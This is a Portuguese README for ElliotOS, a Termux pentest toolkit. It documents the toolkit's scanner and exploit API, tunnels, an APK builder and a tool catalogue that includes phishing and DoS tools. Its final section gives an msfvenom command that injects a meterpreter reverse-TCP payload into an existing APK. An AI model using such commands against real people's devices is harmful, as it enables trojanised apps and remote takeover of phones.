<div align="center">

```
  _____ _ _ _       _    ___  ____
 | ____| | (_) ___ | |_ / _ \/ ___|
 | |_  | | | |/ _ \| __| | | \___ \
 | |___| | | | (_) | |_| |_| |___) |
 |_____|_|_|_|\___/ \__|\___|____/

 Pentest System  //  Android / Termux  //  No Root
```

**O primeiro sistema de pentest nativo para Android — sem root, no bolso.**

[![Plataforma](https://img.shields.io/badge/Plataforma-Android%20%2F%20Termux-green?style=flat-square)](https://github.com/mikeelliot218/ElliotOS)
[![Root](https://img.shields.io/badge/Root-NÃO%20necessário-brightgreen?style=flat-square)](#)
[![Linguagem](https://img.shields.io/badge/Lua%205.4%20%2B%20C%20puro-blue?style=flat-square)](#)
[![Licença](https://img.shields.io/badge/Licença-MIT-lightgrey?style=flat-square)](#licença)
[![Gratuito](https://img.shields.io/badge/Gratuito-100%25-orange?style=flat-square)](#)

</div>

---

## O que é o ElliotOS?

O ElliotOS é um sistema operacional de segurança e pentest construído **dentro do Termux**, o emulador de terminal do Android. Desenvolvido por **Mike Elliot**, nasceu de uma necessidade real: não existia nenhum toolkit de pentest funcional para Android.

Kali Linux, Black Arch, Parrot OS — todos exigem PC. O ElliotOS roda no bolso, direto do celular, **sem root, sem VM, sem frescura**.

Tudo é compilado e instalado via um único script (`luascript.sh`), que constrói do zero:
- Um interpretador Lua 5.4.8 customizado com extensões de rede (`lua-net`)
- Uma biblioteca C com 23 módulos de segurança embutidos (`libnet.so`)
- Uma IA nativa chamada **CYN**, integrada diretamente ao binário
- Ferramentas próprias: `ms`, `lpm`, `xpm`, `cxx`, `ee`, `xtun`

---

## Plataformas suportadas

O instalador detecta o ambiente automaticamente (padrão: Termux) ou pode ser forçado via flag:

| Ambiente | Flag | Gerenciador |
|----------|------|-------------|
| Android / Termux | `--termux` (padrão) | `pkg` |
| Debian / Ubuntu | `--debian` ou `--ubuntu` | `apt` |
| Arch Linux | `--arch` | `pacman` |
| Fedora / RHEL | `--fedora` | `dnf` |

### Arquiteturas suportadas

| Arquitetura | Flags de compilação |
|-------------|---------------------|
| aarch64 / arm64 | `-O2 -march=armv8-a` |
| armv7 / armv8 | `-O2 -march=armv7-a -mfpu=neon` |
| armv6 | `-O2 -march=armv6 -mfpu=vfp` |
| x86_64 | `-O2` |
| i686 / i386 | `-O2 -m32` |
| riscv64 | `-O2` |

---

## Instalação

> **Requisito:** Android com [Termux via F-Droid](https://f-droid.org/packages/com.termux/) — não use a versão da Play Store, está desatualizada.

### Verificação de compatibilidade (Preflight)

Antes de instalar qualquer coisa, o script verifica automaticamente:

| Item | Mínimo | Recomendado |
|------|--------|-------------|
| Bash | 4+ | qualquer >= 4 |
| Android SDK | 21 (Android 5) | 28 (Android 9+) |
| Termux | 0.118 | F-Droid mais recente |
| Espaço livre | 100 MB | 200 MB+ |
| Compilador | gcc (fallback) | clang |
| RAM | 2 GB | 4 GB+ |

---

### Mínimo — só o ElliotOS

Sistema, REPL `ms`, ferramentas de rede e pentest. Sem editor, sem GUI.

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh
```

---

### Com editor — ElliotOS + ElliotOS Editor

Tudo do modo mínimo + editor de texto nativo (`ms -e`).

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh -e
```

---

### Com GUI — ElliotOS + XFCE4 (Termux:X11)

Tudo do modo mínimo + ambiente gráfico XFCE4. Sem editor.

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh --gui
```

---

### Full — ElliotOS + Editor + GUI

Instalação completa: sistema + editor + XFCE4.

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh -e --gui
```

---

### Atualizar — já tem o ElliotOS instalado?

Recompila o binário e atualiza os scripts sem reinstalar dependências.

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh --update
```

---

### Desinstalar

```bash
# Remove apenas o ElliotOS (mantém clang, curl, openssl...)
bash luascript.sh -u

# Remove ElliotOS + todas as dependências do sistema
bash luascript.sh -ua
```

---

### Diagnóstico pós-instalação

```bash
bash luascript.sh --doctor
```

Verifica o estado da instalação atual e reporta problemas sem recompilar nada.

---

### Todas as flags do instalador

```
bash luascript.sh [ambiente] [opções]
```

| Flag | Descrição |
|------|-----------|
| `--termux` | Ambiente Android/Termux (padrão) |
| `--debian` / `--ubuntu` | Ambiente Debian ou Ubuntu (apt) |
| `--arch` | Ambiente Arch Linux (pacman) |
| `--fedora` | Ambiente Fedora / RHEL (dnf) |
| `-e` / `--editor` | Instala o editor MoonStyle (ee) |
| `--gui` | Instala XFCE4 via Termux:X11 |
| `--update` | Recompila binário e atualiza scripts (sem reinstalar deps) |
| `--doctor` | Diagnóstico da instalação atual |
| `-u` / `--uninstall` | Desinstala o ElliotOS (deps mantidas) |
| `-ua` / `--uninstall-all` | Desinstala tudo, inclusive dependências |
| `-sq` | Output verbose da compilação (sem barra de progresso) |
| `-h` / `--help` | Exibe ajuda completa |

> A instalação compila tudo do zero e leva cerca de **15 a 20 minutos** dependendo do dispositivo. Nenhuma etapa exige root.

---

### Dependências instaladas automaticamente

**Termux:** `wget`, `timg`, `which`, `binutils`, `git`, `make`, `cmake`, `build-essential`, `clang`, `figlet`, `tree`, `readline`, `curl`, `libcurl`, `libssh2`, `openssl`, `openssl-tool`, `autoconf`, `whois`, `ncurses`, `nmap`, `file`, `libsqlite`, `sqlite`, `nodejs`, `tgpt`

**Debian/Ubuntu:** `build-essential`, `clang`, `wget`, `git`, `make`, `cmake`, `libreadline-dev`, `libcurl4-openssl-dev`, `libssl-dev`, `libncurses-dev`, `figlet`, `whois`, `curl`, `nmap`, `file`, `libsqlite3-dev`, `sqlite3`, `nodejs`, `tgpt`

**Arch:** `base-devel`, `clang`, `wget`, `git`, `cmake`, `readline`, `curl`, `openssl`, `ncurses`, `figlet`, `whois`, `nmap`, `file`, `sqlite`, `nodejs`, `tgpt`

**Fedora:** `gcc`, `clang`, `make`, `cmake`, `wget`, `git`, `readline-devel`, `libcurl-devel`, `openssl-devel`, `ncurses-devel`, `figlet`, `whois`, `curl`, `nmap`, `file`, `sqlite-devel`, `sqlite`, `nodejs`, `tgpt`

---

## Ferramentas incluídas

### Binários nativos (compilados em C)

| Comando | Descrição |
|---------|-----------|
| `ms` | MoonStyle — REPL interativo Lua 5.4 com extensões de rede |
| `lua-net` | Interpretador Lua com 23 módulos de segurança embutidos |
| `luar` | Lua 5.4 raw (alias do interpretador sem extensões de pentest) |
| `lpm` | Gerenciador de pacotes Lua (instala módulos .lua e exploits) |
| `xpm` | Gerenciador de ferramentas de pentest (instala ferramentas sem root) |
| `cxx` | Compilador C/C++ simplificado para o ambiente ElliotOS |
| `ee` | Editor de texto nativo em C, leve e rápido |
| `xtun` | Tunnel Toolkit — túneis TCP/UDP sem root |

---

## CYN — IA nativa

```
ms -a
```

A CYN é a inteligência artificial integrada diretamente no ElliotOS. Ela conhece todos os módulos, flags, funções e a arquitetura do sistema. Responde sempre em português, é técnica, objetiva e focada em segurança.

O backend usa `tgpt`. Providers disponíveis:

| Provider | Gratuito | Modelo padrão |
|----------|----------|---------------|
| `sky` | ✓ (recomendado) | gpt-4.1-mini |
| `pollinations` | ✓ | — |
| `isou` | ✓ | — |
| `ollama` | ✓ (local) | — |
| `koboldai` | ✓ | — |
| `groq` | requer key | llama-3.3-70b-versatile |
| `openai` | requer key | — |
| `gemini` | requer key | — |
| `deepseek` | requer key | — |

Configuração via REPL:
```lua
ai.provider('sky')                             -- sem chave (recomendado)
ai.provider('groq','llama-3.3-70b-versatile')  -- requer ai.key()
ai.key('sua-chave-aqui')
ai.model('gemma27')
ai.clear()   -- limpa histórico
```

Para uma chave gratuita do Gemini: [aistudio.google.com](https://aistudio.google.com)

---

## ms — Referência de flags

**Geral**
```bash
ms                            # REPL interativo
ms -c 'codigo lua'            # executa Lua sem abrir REPL
ms -f script.lua              # executa arquivo
ms -e                         # abre ElliotOS Editor (arquivo novo)
ms -e arquivo                 # abre/cria arquivo no ElliotOS Editor
ms -e arquivo -v erros.txt    # abre editor + verifica sintaxe (lua, sh, c, py, js)
ms -lua2c arquivo.lua         # transpila Lua → C (gera arquivo.c)
ms -lua2c -r arquivo.lua      # transpila e compila com cxx
ms -i                         # info do sistema
ms -v                         # versão
ms -h                         # ajuda completa
```

**IA (CYN)**
```bash
ms -a                         # chat interativo com a CYN
ms -a 'pergunta'              # pergunta direta
ms -A 'pergunta'              # resposta raw sem formatação
ms -a -f arq 'pergunta'       # passa arquivo como contexto para a CYN
ms --search 'query'           # pesquisa na web via DuckDuckGo e resume
ms --code [-o arq] 'tarefa'   # gera código/script (-o salva no arquivo)
```

**Rede**
```bash
ms -g url                     # HTTP GET
ms --post url dados           # HTTP POST
ms --headers url              # headers da resposta
ms --ip                       # IP público
ms -d host                    # DNS lookup
ms -P host                    # ping
ms --scan host p1 p2          # port scan
ms --listen porta             # listener TCP
ms --socket fam type h p      # fire-and-forget socket
```

**Pentest**
```bash
ms -x url [N]                 # XSS
ms -q url [N]                 # SQLi
ms -l url [N]                 # LFI
ms -r url [N]                 # RCE
ms -N url                     # NoSQL Injection
ms --ssrf url [N]             # SSRF
ms --redir url [N]            # Open Redirect
ms --ssti url [N]             # SSTI
ms --scan-all url [N]         # todos os scanners de uma vez
ms -s url [limit] [ep]        # spider (ep filtra só endpoints)
ms -p easy|med|hard           # sobe lab vulnerável
ms -p stop                    # encerra todos os labs
ms -web arquivo porta         # sobe servidor HTML
ms -web stop                  # para o servidor web
ms --exploit-rce url          # exploit.rce REPL
ms --exploit-sqli url         # exploit.sqli REPL
ms --exploit-lfi url          # exploit.lfi REPL
```

> `N` = número de endpoints a testar (padrão: 1; 0 = todos)

**APK**
```bash
ms --apk app.apk [app2.apk ...]  # testa compatibilidade e instalabilidade
ms --apk-sign app.apk            # alinha e assina um APK já compilado
appforge build <dir> [opções]     # converte HTML/CSS/JS em APK sem root
```

**Distros Linux (proot)**
```bash
ms -ba                            # instala Arch Linux ARM + repositório BlackArch (CLI apenas)
```

> **BlackArch:** funciona apenas em modo CLI. Interface gráfica (GUI) não é suportada em proot.
> **NetHunter:** funciona em CLI e GUI.

**Crypto**
```bash
ms --md5 'texto'              # hash MD5
ms --sha256 'texto'           # hash SHA256
ms --b64e 'texto'             # Base64 encode
ms --b64d 'b64'               # Base64 decode
ms --jwt 'token'              # decodifica JWT
```

**Filesystem**
```bash
ms --cat arquivo              # lê e imprime arquivo
ms --ls [dir]                 # lista diretório
ms --write arq texto          # escreve arquivo
```

**Shell / Sistema**
```bash
ms --sh 'cmd'                 # executa shell e captura output
ms --ps                       # lista processos
ms --kill pid                 # mata processo
ms --env [VAR]                # variáveis de ambiente
```

**Scripts**
```bash
ms --script nome              # executa script Lua ou C do diretório de scripts
ms --script nome -- [args]    # com argumentos
ms --cscript nome.c           # compila e executa script C
ms --cscript binario          # executa binário C já compilado

# Exemplos:
ms --script cosmic.lua -- --os 8.8.8.8
ms --script portscan.lua -- 192.168.1.1 80 443
ms --script xerxes.c -- 192.168.1.1 80
```

**Aprender / Documentação**
```bash
ms --learn                    # tutorial completo: 30 lições em 4 trilhas (Lua, ElliotOS API, C, projetos)
ms --examples                 # lista todos os scripts de exemplo instalados com descrição e categoria
ms --doc                      # documentação completa do ElliotOS
ms --doc modulos              # referência de todos os módulos da API
ms --doc net                  # módulo net.* (HTTP, TCP, UDP, DNS, sockets)
ms --doc mod                  # módulo mod.* (23 scanners de pentest)
ms --doc crypto               # módulo crypto.* (hash, AES, JWT, encoding)
ms --doc sys                  # módulo sys.* (threads, processos, env)
ms --doc fs                   # módulo fs.* (arquivos e diretórios)
ms --doc ai                   # módulo ai.* (CYN — chat, code, search)
```

**Diagnóstico**
```bash
ms -t                         # self-test
ms -tv                        # self-test verbose
ms -T                         # stress test
ms -Tv                        # stress test verbose
```

---

## Módulos da API (globais no REPL — nunca use `require()`)

Todos os módulos abaixo são objetos globais disponíveis automaticamente no REPL e em qualquer script executado com `ms`. Usar `require()` neles causa erro fatal.

---

### `net.*` — Rede

```lua
net.get(url [,{headers,timeout,proxy}])          -- HTTP GET → {code, body, headers}
net.post(url, body [,opts])                      -- HTTP POST
net.fetch(url [,opts])                           -- alias de get com controle fino
net.tcp(host, port)                              -- socket TCP OO → obj:send/:recv/:close/:lines
net.udp(host, port)                              -- socket UDP
net.connect(host, port)                          -- alias de tcp
net.listen(port, fn)                             -- servidor TCP
net.socket(fam, type, host, port, timeout, payload) -- socket raw
net.socketex(fam, type, host, port [,t])         -- socket OO; type='syn' → SYN probe sem root
net.scan(host, p1, p2 [,threads])               -- port scan SYN sem root → tabela de portas abertas
net.ping(host)                                   -- retorna ms ou nil
net.dns(host)                                    -- DNS lookup
net.os(host)                                     -- OS fingerprint sem root
net.ip()                                         -- hosts ativos na rede local (auto-detecta subnet)
net.ip('192.168.1')                              -- scan da subnet especificada
net.ip('cidr', sec)                              -- com timeout em segundos (padrão: 1s, max: 5s)
net.import(url)                                  -- baixa e executa Lua remoto → true/false
```

---

### `mod.*` — Pentest (23 scanners)

```lua
mod.xss(url)             -- XSS reflected/stored/DOM
mod.sqli(url)            -- SQLi: error-based, boolean, time-based, UNION
mod.nosql(url)           -- NoSQL: GET operators + POST JSON, boolean diff
mod.lfi(url)             -- LFI / Path Traversal
mod.rce(url)             -- Remote Code Execution
mod.ssrf(url)            -- SSRF
mod.ssti(url)            -- Server-Side Template Injection
mod.redir(url)           -- Open Redirect
mod.cors(url)            -- CORS misconfiguration
mod.csrf(url)            -- CSRF
mod.jwt(token)           -- JWT: none attack, weak secret
mod.idor(url, param)     -- IDOR
mod.xxe(url)             -- XXE
mod.headers(url)         -- analisa security headers
mod.waf(url)             -- detecta WAF
mod.spider(url, limit)   -- crawler com detecção de WAF, retorna tabela
mod.dirs(url)            -- bruteforce de diretórios
mod.backup(url)          -- arquivos de backup expostos
mod.secrets(url)         -- secrets vazados (API keys, tokens)
mod.params(url)          -- descobre parâmetros ocultos
mod.subdomains(domain)   -- enumeração de subdomínios
mod.chain(url)           -- pipeline automático: classifica endpoints e aplica scanners
mod.redir(url)           -- Open Redirect
```

---

### `exploit.*` — REPLs de exploração interativa

```lua
exploit.rce(url)    -- shell interativo via RCE
exploit.sqli(url)   -- extrator de dados SQLi
exploit.lfi(url)    -- leitor de arquivos via LFI
```

---

### `sys.*` — Sistema e threads

```lua
sys.info()              -- info completo (CPU, RAM, deps)
sys.thread(fn)          -- lança thread Lua isolada, retorna tid
sys.join(tid, ms)       -- aguarda thread terminar, retorna valor
sys.spawn(cmd)          -- executa comando em processo filho, retorna PID
sys.sh(cmd)             -- executa via /bin/sh em thread separada
sys.list()              -- lista tasks ativas (threads + processos)
sys.kill(id)            -- encerra task pelo ID
sys.env(var)            -- lê variável de ambiente
sys.env(var, val)       -- seta variável de ambiente
sys.pid()               -- PID do processo atual
sys.sleep(s)            -- pausa em segundos
sys.time()              -- epoch em segundos
sys.time_ms()           -- epoch em milissegundos
sys.exit(n)             -- encerra com código de saída
sys.mutex()             -- cria mutex para sincronização entre threads
sys.channel()           -- cria canal de comunicação entre threads
```

---

### `crypto.*` — Criptografia (OpenSSL)

```lua
crypto.md5(s)           -- hash MD5
crypto.sha1(s)          -- hash SHA1
crypto.sha256(s)        -- hash SHA256
crypto.sha512(s)        -- hash SHA512
crypto.hmac(key, data, algo) -- HMAC-SHA256
crypto.aes_enc(key, data)    -- AES-256 encrypt
crypto.aes_dec(key, data)    -- AES-256 decrypt
crypto.b64e(s)          -- Base64 encode
crypto.b64d(s)          -- Base64 decode
crypto.rand(n)          -- n bytes aleatórios
crypto.jwt(token)       -- decodifica JWT
```

---

### `fs.*` — Filesystem

```lua
fs.read(path)           -- lê arquivo, retorna string ou nil, err
fs.write(path, data)    -- escreve arquivo
fs.append(path, data)   -- adiciona ao final do arquivo
fs.exists(path)         -- boolean
fs.mkdir(path)          -- cria diretório
fs.move(src, dst)       -- move/renomeia
fs.copy(src, dst)       -- copia arquivo
fs.delete(path)         -- remove arquivo
fs.stat(path)           -- retorna {size, mtime, type}
fs.chmod(path, mode)    -- muda permissões
fs.ls(dir)              -- lista diretório, retorna tabela
fs.glob(pattern)        -- glob (ex: '*.lua')
```

---

### `db.*` — SQLite3 embutido

```lua
db.open(path)           -- abre/cria banco SQLite3
db.close()              -- fecha o banco
db.exec(sql)            -- executa sem retorno (CREATE, INSERT, UPDATE, DELETE)
db.query(sql)           -- SELECT → tabela Lua [{col=val,...}, ...]
db.tables()             -- lista tabelas do banco
db.help()               -- ajuda do módulo
```

---

### `ai.*` — Interface com a CYN

```lua
ai.ask(msg)             -- pergunta para a CYN
ai.code(tarefa)         -- gera código técnico
ai.search(query)        -- pesquisa na web e resume
ai.model(nome)          -- troca modelo (flash, pro, gemma27...)
ai.key(chave)           -- define API key
ai.provider(nome [,modelo]) -- troca provider
ai.clear()              -- limpa histórico de conversa
```

---

### `web.*` — Parsing e servidor web

```lua
web.get(url [,opts])         -- baixa HTML/CSS/JS, segue redirects, UA browser
                              -- opts: {timeout, ua, quiet, headers, file}
                              -- retorna: html, code ou nil, errmsg
web.links(html)              -- extrai href de <a>/<link> e src de <img>/<script>
web.forms(html)              -- extrai <form> com inputs, selects, textareas
web.scripts(html)            -- extrai <script> externos e inline
web.serve(path, port [,opts]) -- servidor HTTP estático em background
web.stop()                   -- para o servidor iniciado por web.serve()
```

---

### `dow.*` — Download de mídia

Motor híbrido: YouTube usa `yt-dlp`; outros sites usam Cobalt API + wget. Todos os arquivos são salvos em `~/Downloads/`.

```lua
dow.video(url)      -- baixa vídeo (YouTube → yt-dlp, outros → Cobalt)
dow.audio(url)      -- extrai áudio
dow.imagen(url)     -- baixa imagem via URL direta
dow.playlist(url)   -- baixa playlist YouTube via yt-dlp
dow.info(url)       -- mostra status das ferramentas e instância Cobalt
dow.reset()         -- troca instância Cobalt em cache
dow.help()          -- exibe ajuda do módulo
```

> YouTube requer: `pkg install python-yt-dlp`

---

### `sh.*` — Shell direto

```lua
sh.exec(cmd)    -- executa e retorna saída
sh.read(cmd)    -- alias de exec
```

---

### `pent.*` — Lab local vulnerável

```lua
pent.start(level, port) -- sobe lab (easy/med/hard)
pent.stop()             -- para todos os labs
pent.status()           -- status dos labs rodando
```

Portas: `8081` (easy), `8082` (med), `8083` (hard).

Endpoints disponíveis: `/search`, `/login`, `/xss`, `/comment`, `/dom`, `/exec`, `/file`, `/path`, `/note`, `/tpl`, `/upload`, `/api/users`, `/api/me`, `/api/users/login`, `/api/products`, `/api/search`, `/redirect`, `/cors`, `/csrf`, `/jwt`, `/xxe`, `/admin`, `/register`, `/reset`, `/debug`, `/backup`, `/ssrf`, `/serialize`, `/rate`, `/headers`

Flags de exemplo: `FLAG{easy_sqli_win}`, `FLAG{nosql_auth_bypass}`, `FLAG{jwt_none_attack}`, `FLAG{lfi_found_you}`, `FLAG{ssrf_internal_fetch}`

---

### `lmod.*` — Criador de módulos Lua

```lua
lmod.new("nome" [, tipo])  -- cria módulo em ~/.lua-modules/nome.lua
                            -- tipos: scanner | recon | util | generic (padrão)
lmod.mod("arquivo.lua")    -- copia/registra arquivo Lua existente como módulo
lmod.list()                -- lista módulos instalados em ~/.lua-modules
lmod.remove("nome")        -- remove módulo
lmod.path()                -- mostra o diretório de módulos
lmod.help()                -- ajuda com exemplos
```

Módulos criados com `lmod` são carregados via `require("nome")` nos scripts.

---

### `cc.*` — Compilador C inline e transpilador Lua → C

```lua
cc.run(codigo_c)        -- compila e executa código C direto do REPL
cc.lua2c(arquivo_lua)   -- transpila arquivo Lua para C
cc.help()               -- ajuda do módulo
```

O transpilador `cc.lua2c` cobre Lua 5.4: funções named/locais/anônimas, retorno múltiplo, tabelas como arrays C, inferência de tipo (`int`/`double`/`char[]`/`const char*`), e forward declarations automáticas.

---

### `adb.*` — Android Debug Bridge via Wi-Fi (Shizuku)

Usa o binário `adb` do Termux (`pkg install android-tools`). Funciona sem root via protocolo ADB over TCP.

```lua
adb.pair("ip:porta", "codigo") -- pareia via Wi-Fi (Android 11+)
adb.connect("ip:porta")        -- conecta ao dispositivo
adb.disconnect()               -- desconecta
adb.devices()                  -- lista dispositivos conectados
adb.shell("cmd")               -- executa comando como ADB shell
adb.repl()                     -- shell interativo ADB
adb.push("local", "remoto")    -- copia arquivo para o device
adb.pull("remoto", "local")    -- copia arquivo do device
adb.install("app.apk")         -- instala APK
adb.reboot("recovery"|"fastboot") -- reinicia o device
adb.screenshot()               -- captura tela
adb.prop()                     -- lista propriedades do sistema
adb.forward(lport, rport)      -- port forwarding
adb.wifi()                     -- info de Wi-Fi
adb.status()                   -- status da conexão ADB
adb.tap(x, y)                  -- simula toque na tela
adb.swipe(x1, y1, x2, y2)     -- simula gesto de swipe
adb.keyevent(code)             -- envia evento de tecla
adb.text("texto")              -- digita texto
adb.screen_size()              -- resolução da tela
adb.screen_density()           -- densidade da tela
adb.game_mode(bool)            -- ativa/desativa modo game
adb.setup()                    -- configura ambiente ADB
```

---

### `ui.*` — Interface de terminal

```lua
ui.color(code, texto) -- texto colorido (códigos ANSI)
ui.box(texto)         -- desenha caixa ao redor do texto
ui.clear()            -- limpa a tela
ui.sleep(s)           -- pausa em segundos
ui.fig(texto)         -- ASCII art via figlet
ui.input([prompt])    -- lê linha do usuário
ui.help()             -- ajuda do módulo
```

---

### `tui.*` — Framework de UI de terminal interativo

```lua
tui.main()        -- inicia loop principal de UI
tui.func(fn)      -- registra função de callback
tui.close()       -- encerra a UI
tui.read()        -- lê evento de teclado
tui.help()        -- ajuda do módulo
```

---

## xtun — Tunnel Toolkit

Ferramenta standalone compilada em C para criação de túneis TCP e UDP, sem root, sem dependências externas.

```bash
# Local forward (como ssh -L)
xtun -L [bind:]lport:rhost:rport

# Reverse forward (como ssh -R)
xtun -R [bind:]lport:rhost:rport

# Forward UDP (datagrama, sem conexão)
xtun -U [bind:]lport:rhost:rport

# Modo listener cru (proxy TCP simples)
xtun -l porta
```

Útil para expor portas locais (servidores Love2D/LAN, painéis web) para fora do device sem root.

---

## appforge — HTML/CSS/JS para APK

O `appforge` converte qualquer projeto web local em um APK Android funcional, **sem root, sem Android Studio, sem PC**. Não vem instalado por padrão — é uma ferramenta do XPM:

```bash
xpm install appforge
```

```bash
# Estrutura mínima do projeto
./meuapp/
├── index.html   ← ponto de entrada obrigatório
├── style.css
└── script.js

# Analisar o projeto antes de compilar
appforge check ./meuapp/

# Gerar APK básico
appforge build ./meuapp/

# Com nome, ícone e permissões
appforge build ./meuapp/ --name "Meu App" --pkgname com.meuapp --perm camera,mic --fullscreen

# Converter um site remoto em APK
appforge build --url https://exemplo.com --name "Meu Site"

# Gerar template de projeto pronto para editar
appforge template basic    # HTML + CSS + JS básico
appforge template game     # Jogo Snake funcional
appforge template pwa      # PWA com suporte offline

# Manual: o que cada arquivo deve conter para o APK funcionar
appforge --man

# Verificar ferramentas de build instaladas (sem argumento)
appforge check
```

### `appforge check <dir>` — Análise do projeto

Analisa todos os arquivos do projeto e retorna um relatório com três níveis de severidade:

| Cor | Nível | Significado |
|-----|-------|-------------|
| 🔵 Azul | OK | Verificação passou, está correto |
| 🟡 Amarelo | Aviso | Pode compilar, mas pode falhar em runtime ou ter comportamento inesperado |
| 🔴 Vermelho | Fatal | Não vai compilar — precisa corrigir antes |

**O que é verificado:**

Erros fatais (🔴) — impedem a compilação:
- `index.html` ausente
- Sem `<!DOCTYPE html>`
- Sem `<meta charset>`
- Sem `<meta name="viewport">` (layout quebrado no Android)
- Caminhos absolutos do sistema (`/home/user/`, `/sdcard/`, `/root/`)

Avisos (🟡) — compilam, mas podem falhar no app:
- `<script>` no `<head>` sem `defer`/`async`/`DOMContentLoaded`
- Recursos externos via URL em `<link>`/`<script src>` (não funciona offline)
- Google Fonts via CDN (requer internet)
- Caminhos absolutos tipo `src="/img"` (use relativos)
- `@import url(https://...)` no CSS
- `fetch()` para URL externa no JS (CORS bloqueado no WebView)
- `import` de URL externa no JS
- `navigator.geolocation` sem permissão declarada
- `document.write()` (corrompe layout no WebView)
- Muitos `font-size` em `px` fixo (não escala no Android)

Sugestões (🔵 dim) — melhorias opcionais:
- `style.css` ausente na raiz
- `script.js` ausente na raiz
- Imagens pesadas (> 2 MB total)

```bash
appforge check ./meuapp/
# saída exemplo:
#   8 arquivo(s): 1 HTML  1 CSS  1 JS  5 outros
#   [OK]    index.html presente
#   [OK]    <!DOCTYPE html> presente
#   [OK]    charset presente
#   [OK]    viewport presente
#   [WARN]  script.js: fetch() para URL externa — pode falhar por CORS no WebView
#   [DICA]  Imagens pesadas (>2MB total) — considere compressão
#
#   1 aviso(s) — pode compilar, mas revise antes.
#   4 verificação(ões) OK
```

### Opções principais do `appforge build`

| Opção | Descrição |
|-------|-----------|
| `--name "Nome"` | Nome exibido no launcher |
| `--pkgname com.pkg.id` | Package ID único |
| `--icon /path/icon.png` | Ícone PNG do app |
| `--perm cam,mic,...` | Permissões Android |
| `--orientation portrait\|landscape\|auto` | Orientação da tela |
| `--fullscreen` | Esconde a status bar |
| `--theme dark\|light\|transparent` | Tema da WebView |
| `--url https://...` | Carrega URL remota em vez de arquivos locais |

---

## ms -ba — Arch Linux ARM + BlackArch

O `ms -ba` instala o **Arch Linux ARM** dentro do Termux via proot e configura o repositório **BlackArch** — dando acesso a mais de 2.800 ferramentas de segurança, sem root.

```bash
ms -ba
```

O instalador:
- Baixa e verifica o rootfs do Arch Linux ARM (aarch64)
- Configura o pacman com `DisableSandbox` para funcionar em proot
- Inicializa o keyring (`pacman-key --init/--populate`)
- Adiciona o repositório BlackArch via `strap.sh` oficial

### Suporte

| Modo | NetHunter | BlackArch |
|------|-----------|-----------|
| CLI  | ✓         | ✓         |
| GUI (XFCE4/VNC) | ✓ | ✗ (não suportado em proot) |

> Interface gráfica não funciona no BlackArch em proot devido a limitações de sandboxing (`bwrap`/`glycin`) incompatíveis com o ambiente Android.

### Acessar o container

```bash
archlinux          # entra no Arch Linux ARM como root
```

### Instalar ferramentas BlackArch

```bash
# Dentro do container (archlinux):
pacman -S nmap sqlmap burpsuite
pacman -Sg blackarch            # lista todos os grupos
pacman -Sg blackarch-scanner    # ferramentas de scan
pacman -Sg blackarch-exploitation
```

---

## XPM — Gerenciador de Pentest

O `xpm` instala ferramentas de segurança **sem usar o repositório do Termux**. Tudo é compilado do código-fonte ou instalado via pip/go/cargo diretamente.

```bash
xpm search list            # ver todas as ferramentas disponíveis
xpm search nmap            # buscar ferramenta específica
xpm install sqlmap         # instalar uma ferramenta
xpm install sqlmap nikto dirsearch nmap  # instalar várias de uma vez
xpm list                   # ver o que está instalado
xpm update sqlmap          # atualizar uma ferramenta
xpm upgrade                # atualizar todas as ferramentas instaladas
xpm remove sqlmap          # remover
xpm info <ferramenta>      # detalhes sobre uma ferramenta
xpm categories             # listar categorias disponíveis
xpm stats                  # estatísticas do catálogo
xpm doctor                 # diagnóstico e correções do ambiente
```

### Ferramentas disponíveis no XPM

| Categoria | Ferramenta | Método de instalação |
|-----------|------------|----------------------|
| Scanner | nmap, rustscan, naabu | Compilado do fonte |
| Web | sqlmap, nikto, commix, whatweb, xsstrike | pip / fonte |
| Fuzzing | ffuf, gobuster, dirsearch, wfuzz | go / pip |
| Reconhecimento | amass, subfinder, assetfinder, dnsrecon | go / pip |
| OSINT | sherlock, maigret, holehe, sublist3r, theharvester | pip |
| Password | hydra, john | Compilado do fonte |
| Exploração | metasploit, sqlmap, searchsploit, slowloris | gem / pip / fonte |
| Engenharia Reversa | radare2, binwalk, ropper, androguard | fonte / pip |
| MITM | mitmproxy | pip |
| Malware | yara | Compilado do fonte |
| Eng. Social | zphisher | github |
| CTF / Binários | pwntools | pip |
| Wordlists | seclists | github |
| AD / Rede | impacket, nuclei | pip / go |
| Criação de APK | appforge | nativo ElliotOS |

> **Nenhuma ferramenta exige root para ser instalada ou usada no Termux.**

---

## msfvenom — Payload em APK com template

O ElliotOS integra o Metasploit com suporte a `msfvenom -x` para injetar payloads em APKs existentes.

```bash
# Passo 1 — instalar as ferramentas
xpm install apkfull apkeditor metasploit

# Passo 2 — aplicar otimizações e correções no ambiente
xpm doctor
```

O `xpm doctor` não é opcional — ele é quem configura o ambiente de verdade. Ao rodar, ele:

- Substitui o apktool interno do Metasploit pelo **apkeditor** no `apk.rb`, garantindo compatibilidade com APKs antigos e modernos
- Corrige referências a `/tmp` (que **não existe no Termux**) redirecionando para `$TMPDIR` → `/data/data/com.termux/files/usr/tmp`
- Instala wrappers de `msfvenom`, `msfconsole` e `msfrpc` com heap adaptativo para Android
- Cria e configura o keystore de assinatura de APKs
- Aplica correções no `apk.rb`: flags, versão mínima, caminhos de payload, multidex, fallback de Activity e FileUtils
- Remove arquivos desnecessários do bundle (docs, spec, test, .github) para economizar espaço
- Sobe o banco de dados do msfdb

```bash
# Gerar payload e injetar em um APK template
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -x /caminho/template.apk \
  -o payload.apk
```

### Por que apkeditor e não apktool nativo?

| | apktool (padrão do Metasploit) | apkeditor (ElliotOS) |
|---|---|---|
| APKs antigos (pré-2018) | ✓ | ✓ |
| APKs modernos (Android 10+) | ✗ parcial | ✓ |
| APKs com resources binários | ✗ falha | ✓ |
| Split APKs | ✗ | ✓ |
| Disponível no Termux sem root | ✗ | ✓ (tur-repo) |
| Compatível com `$TMPDIR` do Termux | ✗ | ✓ |

---
